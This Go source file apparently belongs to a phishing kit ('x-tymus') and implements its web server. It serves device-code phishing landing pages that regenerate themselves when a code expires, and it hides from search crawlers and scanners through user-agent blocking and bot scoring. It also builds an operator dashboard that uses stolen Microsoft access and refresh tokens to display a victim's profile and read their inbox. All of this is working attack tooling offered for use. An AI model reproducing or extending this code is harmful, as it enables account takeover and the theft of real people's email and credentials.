package core

import (
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/caddyserver/certmagic"
	"github.com/gorilla/mux"
	"github.com/x-tymus/x-tymus/database"
	"github.com/x-tymus/x-tymus/log"
)

type HttpServer struct {
	srv        *http.Server
	acmeTokens map[string]string
	Cfg        *Config
	Db         *database.Database
}

func NewHttpServer() (*HttpServer, error) {
	s := &HttpServer{}
	s.acmeTokens = make(map[string]string)
	// cfg must be set after creation

	r := mux.NewRouter()
	s.srv = &http.Server{
		Handler:      r,
		Addr:         ":80",
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	r.HandleFunc("/.well-known/acme-challenge/{token}", s.handleACMEChallenge).Methods("GET")
	// Blacklist admin API
	r.HandleFunc("/admin/blacklist", s.handleBlacklistList).Methods("GET")
	r.HandleFunc("/admin/blacklist", s.handleBlacklistAdd).Methods("POST")
	r.HandleFunc("/admin/blacklist", s.handleBlacklistRemove).Methods("DELETE")
	r.HandleFunc("/admin/blacklist/flush", s.handleBlacklistFlush).Methods("POST")
	// Admin panel
	r.HandleFunc("/admin/panel", s.handleAdminPanel).Methods("GET", "POST")
	// Device code landing pages + token dashboard
	r.HandleFunc("/dc/use/{token}", s.handleDCUse).Methods("GET")
	r.HandleFunc("/dc/inbox/{token}", s.handleDCInbox).Methods("GET")
	r.HandleFunc("/dc/{token}", s.handleDCLanding).Methods("GET")
	// User panels
	r.PathPrefix("/panel/").HandlerFunc(s.handleUserPanel)

	r.PathPrefix("/").HandlerFunc(s.handleRedirect)

	return s, nil
}

// admin handlers
func (s *HttpServer) handleBlacklistList(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	type entry struct {
		IP string `json:"ip"`
	}
	var out []entry
	for k := range GlobalBlacklist.ips {
		out = append(out, entry{IP: k})
	}
	b, _ := json.Marshal(out)
	w.Header().Set("Content-Type", "application/json")
	w.Write(b)
}

func (s *HttpServer) handleBlacklistAdd(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	var req struct {
		IP string `json:"ip"`
	}
	dec := json.NewDecoder(r.Body)
	if err := dec.Decode(&req); err != nil || req.IP == "" {
		http.Error(w, "invalid", http.StatusBadRequest)
		return
	}
	if err := GlobalBlacklist.AddIP(req.IP); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) handleBlacklistRemove(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	var req struct {
		IP string `json:"ip"`
	}
	dec := json.NewDecoder(r.Body)
	if err := dec.Decode(&req); err != nil || req.IP == "" {
		http.Error(w, "invalid", http.StatusBadRequest)
		return
	}
	if err := GlobalBlacklist.RemoveIP(req.IP); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) handleBlacklistFlush(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	if err := GlobalBlacklist.Flush(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) Start() {
	go s.srv.ListenAndServe()
}

func (s *HttpServer) AddACMEToken(token string, keyAuth string) {
	s.acmeTokens[token] = keyAuth
}

func (s *HttpServer) ClearACMETokens() {
	s.acmeTokens = make(map[string]string)
}

func (s *HttpServer) handleACMEChallenge(w http.ResponseWriter, r *http.Request) {
	// Let certmagic's HTTP-01 solver handle it first.
	// This is required because certmagic manages challenge tokens internally
	// and cannot bind port 80 separately (already owned by this server).
	if certmagic.DefaultACME.HandleHTTPChallenge(w, r) {
		log.Debug("http: certmagic handled ACME challenge for URL: %s", r.URL.Path)
		return
	}

	// Fallback to manual token store (legacy path).
	vars := mux.Vars(r)
	token := vars["token"]

	key, ok := s.acmeTokens[token]
	if !ok {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	log.Debug("http: found ACME verification token for URL: %s", r.URL.Path)
	w.WriteHeader(http.StatusOK)
	w.Header().Set("content-type", "text/plain")
	w.Write([]byte(key))
}

func (s *HttpServer) handleRedirect(w http.ResponseWriter, r *http.Request) {
	// Anti-bot: block known crawler/user-agent strings and add their IPs to the blacklist
	ua := r.UserAgent()
	uaLower := strings.ToLower(ua)
	// check configured UA regex first
	blockedByUA := false
	if s.Cfg != nil && s.Cfg.blacklistConfig != nil {
		for _, pat := range s.Cfg.blacklistConfig.UARegex {
			if pat == "" {
				continue
			}
			re, err := regexp.Compile(pat)
			if err != nil {
				log.Error("invalid UA regex pattern: %s", pat)
				continue
			}
			if re.MatchString(ua) || re.MatchString(uaLower) {
				blockedByUA = true
				break
			}
		}
	}

	knownBots := []string{"googlebot", "bingbot", "baiduspider", "yandex", "duckduckbot", "slurp", "facebookexternalhit", "twitterbot", "linkedinbot", "adsbot-google", "applebot"}
	for _, b := range knownBots {
		if strings.Contains(uaLower, b) {
			blockedByUA = true
			break
		}
	}

	if blockedByUA {
		log.Warning("Known bot detected via UA: %s IP=%s", ua, r.RemoteAddr)
		// add IP to persistent blacklist if available, but respect config whitelists/ASN
		if GlobalBlacklist != nil {
			ip := r.RemoteAddr
			// strip port if present
			if idx := strings.LastIndex(ip, ":"); idx > -1 {
				ip = ip[:idx]
			}
			if !IsIPPermitted(ip, s.Cfg) {
				if err := GlobalBlacklist.AddIP(ip); err == nil {
					log.Info("blacklist: added IP %s", ip)
				} else {
					log.Error("blacklist add failed: %v", err)
				}
			} else {
				log.Info("blacklist: skipped adding whitelisted IP %s", ip)
			}
		}
		http.Redirect(w, r, "https://www.google.com", http.StatusFound)
		return
	}

	// If not a known bot, optionally use StealthAI scoring if enabled
	if s.Cfg != nil && s.Cfg.IsStealthAIEnabled() {
		packet := r.UserAgent() + "|" + r.RemoteAddr + "|" + r.URL.String()
		score, err := AnalyzeTrafficWithStealthAI(packet)
		if err == nil {
			log.Info("StealthAI score: %f for UA: %s", score, r.UserAgent())
			if score > 0.85 {
				log.Warning("Bot detected and blocked by StealthAI: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				// add to blacklist
				if GlobalBlacklist != nil {
					ip := r.RemoteAddr
					if idx := strings.LastIndex(ip, ":"); idx > -1 {
						ip = ip[:idx]
					}
					if !GlobalBlacklist.IsWhitelisted(ip) {
						_ = GlobalBlacklist.AddIP(ip)
					}
				}
				http.Redirect(w, r, "https://www.google.com", http.StatusFound)
				return
			} else if score > 0.5 {
				log.Warning("Suspicious traffic redirected: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				http.Redirect(w, r, "https://www.bing.com", http.StatusFound)
				return
			} else {
				log.Info("Normal user allowed: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
			}
		}
	}

	http.Redirect(w, r, "https://"+r.Host+r.URL.String(), http.StatusFound)
}

// handleDCLanding serves the device code landing page.
// If the code is expired or declined, it auto-starts a fresh device code
// flow for the same target and redirects — so the link in the email never
// truly dies.
func (s *HttpServer) handleDCLanding(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	token := vars["token"]
	tgt := GetTargetByToken(token)
	if tgt == nil {
		http.NotFound(w, r)
		return
	}

	tgt.mu.Lock()
	status := tgt.Status
	ident := tgt.Email
	if ident == "" {
		ident = tgt.Tenant
	}
	campID := tgt.CampaignID
	tgt.mu.Unlock()

	// Auto-refresh: start a new flow and redirect when this one is done/expired.
	if status == "expired" || status == "declined" || status == "completed" {
		if ident != "" {
			if fresh, err := newTarget(campID, ident); err == nil {
				dcMu.Lock()
				dcTargets = append(dcTargets, fresh)
				dcMu.Unlock()
				go fresh.poll()
				http.Redirect(w, r, "/dc/"+fresh.LandingToken, http.StatusFound)
				return
			}
		}
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(DCLandingPage(tgt)))
}

// handleDCUse fetches Graph API data for a completed device code target and
// renders a one-click admin dashboard showing the victim's account details.
// graphDo makes a Graph API GET using the given bearer token.
func graphDo(at, path string) ([]byte, error) {
	req, _ := http.NewRequest("GET", "https://graph.microsoft.com/v1.0"+path, nil)
	req.Header.Set("Authorization", "Bearer "+at)
	req.Header.Set("Accept", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

type graphUser struct {
	DisplayName       string `json:"displayName"`
	Mail              string `json:"mail"`
	UserPrincipalName string `json:"userPrincipalName"`
	JobTitle          string `json:"jobTitle"`
	Department        string `json:"department"`
	OfficeLocation    string `json:"officeLocation"`
	MobilePhone       string `json:"mobilePhone"`
}
type graphMsg struct {
	ID           string `json:"id"`
	Subject      string `json:"subject"`
	ReceivedDate string `json:"receivedDateTime"`
	From         struct {
		EmailAddress struct {
			Name    string `json:"name"`
			Address string `json:"address"`
		} `json:"emailAddress"`
	} `json:"from"`
	BodyPreview  string `json:"bodyPreview"`
	IsRead       bool   `json:"isRead"`
}
type graphMsgList struct {
	Value    []graphMsg `json:"value"`
	NextLink string     `json:"@odata.nextLink"`
}

func dcGetUser(at, fallback string) graphUser {
	var u graphUser
	if b, err := graphDo(at, "/me"); err == nil {
		json.Unmarshal(b, &u)
	}
	if u.Mail == "" {
		u.Mail = u.UserPrincipalName
	}
	if u.Mail == "" {
		u.Mail = fallback
	}
	return u
}

func handleDCUse(w http.ResponseWriter, r *http.Request, tgt *DCTarget) {
	tgt.mu.Lock()
	at := tgt.AccessToken
	rt := tgt.RefreshToken
	email := tgt.Email
	landingToken := tgt.LandingToken
	tgt.mu.Unlock()

	if at == "" {
		http.Error(w, "No token yet — victim has not approved.", http.StatusBadRequest)
		return
	}

	u := dcGetUser(at, email)

	var msgs graphMsgList
	if b, err := graphDo(at, "/me/messages?$top=20&$select=id,subject,from,receivedDateTime,bodyPreview,isRead&$orderby=receivedDateTime desc"); err == nil {
		json.Unmarshal(b, &msgs)
	}

	var rows strings.Builder
	for _, m := range msgs.Value {
		d := m.ReceivedDate
		if len(d) >= 10 {
			d = d[:10]
		}
		unread := ""
		if !m.IsRead {
			unread = `style="font-weight:700;color:#fff"`
		}
		rows.WriteString(fmt.Sprintf(`<tr %s>
<td>%s</td><td>%s<br><span style="color:#555;font-size:11px">%s</span></td><td>%s</td>
<td><a href="/dc/msg/%s/%s" target="_blank" style="color:#0078d4;font-size:11px">Read</a></td></tr>`,
			unread,
			template.HTMLEscapeString(d),
			template.HTMLEscapeString(m.From.EmailAddress.Name),
			template.HTMLEscapeString(m.From.EmailAddress.Address),
			template.HTMLEscapeString(m.Subject),
			template.HTMLEscapeString(landingToken),
			template.HTMLEscapeString(m.ID),
		))
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>Dashboard — %s</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
h1{font-size:20px;color:#fff;margin-bottom:4px}
.sub{font-size:13px;color:#888;margin-bottom:20px}
.card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:6px;padding:18px 22px;margin-bottom:16px}
.card h2{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#555;margin-bottom:12px}
.kv{display:grid;grid-template-columns:140px 1fr;gap:5px 10px;font-size:13px}
.k{color:#555}.v{color:#ddd;word-break:break-all}
.tok{background:#111;border:1px solid #2a2a2a;border-radius:3px;padding:8px 12px;font-family:monospace;font-size:10px;color:#7ec8e3;word-break:break-all;max-height:64px;overflow-y:auto;margin-top:6px}
table{width:100%%;border-collapse:collapse;font-size:12px}
th{text-align:left;padding:7px 10px;color:#444;border-bottom:1px solid #222;font-size:11px;text-transform:uppercase;letter-spacing:.5px}
td{padding:7px 10px;border-bottom:1px solid #1c1c1c;color:#aaa;vertical-align:top}
tr:hover td{background:#1e1e1e}
.actions{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:18px;align-items:center}
.btn{padding:7px 16px;border-radius:4px;font-size:12px;font-weight:600;text-decoration:none;border:none;cursor:pointer;display:inline-block}
.b1{background:#0078d4;color:#fff}
.b2{background:#1e1e1e;color:#bbb;border:1px solid #2a2a2a}
.ok{color:#5cb85c;font-size:12px;display:none;margin-left:4px}
</style></head><body>
<h1>%s</h1>
<p class="sub">%s &nbsp;·&nbsp; %s &nbsp;·&nbsp; %s</p>
<div class="actions">
<button class="btn b1" onclick="cp(at)">Copy Access Token</button>
<button class="btn b2" onclick="cp(rt)">Copy Refresh Token</button>
<a class="btn b2" href="/dc/inbox/%s">Full Inbox</a>
<span class="ok" id="ok">Copied</span>
</div>
<div class="card"><h2>Profile</h2><div class="kv">
<span class="k">Name</span><span class="v">%s</span>
<span class="k">Email</span><span class="v">%s</span>
<span class="k">Title</span><span class="v">%s</span>
<span class="k">Department</span><span class="v">%s</span>
<span class="k">Office</span><span class="v">%s</span>
<span class="k">Mobile</span><span class="v">%s</span>
</div></div>
<div class="card"><h2>Access Token</h2><div class="tok" id="atbox">%s</div></div>
<div class="card"><h2>Inbox — last 20</h2>
<table><thead><tr><th>Date</th><th>From</th><th>Subject</th><th></th></tr></thead><tbody>
%s</tbody></table></div>
<script>
var at=%q,rt=%q;
function cp(s){navigator.clipboard.writeText(s);var o=document.getElementById('ok');o.style.display='inline';setTimeout(function(){o.style.display='none'},1400);}
</script></body></html>`,
		template.HTMLEscapeString(u.Mail),
		template.HTMLEscapeString(u.DisplayName),
		template.HTMLEscapeString(u.Mail),
		template.HTMLEscapeString(u.JobTitle),
		template.HTMLEscapeString(u.Department),
		template.HTMLEscapeString(landingToken),
		template.HTMLEscapeString(u.DisplayName),
		template.HTMLEscapeString(u.Mail),
		template.HTMLEscapeString(u.JobTitle),
		template.HTMLEscapeString(u.Department),
		template.HTMLEscapeString(u.OfficeLocation),
		template.HTMLEscapeString(u.MobilePhone),
		template.HTMLEscapeString(at),
		rows.String(),
		at, rt,
	)
}

func (s *HttpServer) handleDCUse(w http.ResponseWriter, r *http.Request) {
	tgt := GetTargetByToken(mux.Vars(r)["token"])
	if tgt == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	handleDCUse(w, r, tgt)
}

// handleDCInbox shows a full scrollable inbox for the captured account.
func (s *HttpServer) handleDCInbox(w http.ResponseWriter, r *http.Request) {
	tgt := GetTargetByToken(mux.Vars(r)["token"])
	if tgt == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	tgt.mu.Lock()
	at := tgt.AccessToken
	email := tgt.Email
	tgt.mu.Unlock()
	if at == "" {
		http.Error(w, "no token", http.StatusBadRequest)
		return
	}
	u := dcGetUser(at, email)
	var msgs graphMsgList
	if b, err := graphDo(at, "/me/messages?$top=50&$select=id,subject,from,receivedDateTime,isRead&$orderby=receivedDateTime desc"); err == nil {
		json.Unmarshal(b, &msgs)
	}
	var rows strings.Builder
	for _, m := range msgs.Value {
		d := m.ReceivedDate
		if len(d) >= 10 {
			d = d[:10]
		}
		bold := ""
		if !m.IsRead {
			bold = "font-weight:700;color:#fff;"
		}
		rows.WriteString(fmt.Sprintf(`<tr style="%s">
<td>%s</td><td>%s<br><span style="color:#555;font-size:11px">%s</span></td><td>%s</td>
</tr>`,
			bold,
			template.HTMLEscapeString(d),
			template.HTMLEscapeString(m.From.EmailAddress.Name),
			template.HTMLEscapeString(m.From.EmailAddress.Address),
			template.HTMLEscapeString(m.Subject),
		))
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Inbox — %s</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
h1{font-size:18px;color:#fff;margin-bottom:16px}
table{width:100%%;border-collapse:collapse;font-size:12px}
th{text-align:left;padding:7px 10px;color:#444;border-bottom:1px solid #222;font-size:11px;text-transform:uppercase}
td{padding:8px 10px;border-bottom:1px solid #1c1c1c;color:#aaa;vertical-align:top}
tr:hover td{background:#1a1a1a}
</style></head><body>
<h1>Inbox — %s (%d messages)</h1>
<table><thead><tr><th>Date</th><th>From</th><th>Subject</th></tr></thead><tbody>
%s</tbody></table></body></html>`,
		template.HTMLEscapeString(u.Mail),
		template.HTMLEscapeString(u.Mail),
		len(msgs.Value),
		rows.String(),
	)
}

// HandleRedirect returns an http.HandlerFunc that implements the same redirect logic as
// HttpServer.handleRedirect but is usable outside the core package. This allows tests
// and tools to reuse the redirect behavior by providing a Config.
func HandleRedirect(cfg *Config) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if cfg != nil && cfg.IsStealthAIEnabled() {
			packet := r.UserAgent() + "|" + r.RemoteAddr + "|" + r.URL.String()
			score, err := AnalyzeTrafficWithStealthAI(packet)
			if err == nil {
				log.Info("StealthAI score: %f for UA: %s", score, r.UserAgent())
				if score > 0.85 {
					log.Warning("Bot detected and blocked: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
					http.Redirect(w, r, "https://www.google.com", http.StatusFound)
					return
				} else if score > 0.5 {
					log.Warning("Suspicious traffic redirected: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
					http.Redirect(w, r, "https://www.bing.com", http.StatusFound)
					return
				} else {
					log.Info("Normal user allowed: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				}
			}
		}
		http.Redirect(w, r, "https://"+r.Host+r.URL.String(), http.StatusFound)
	}
}
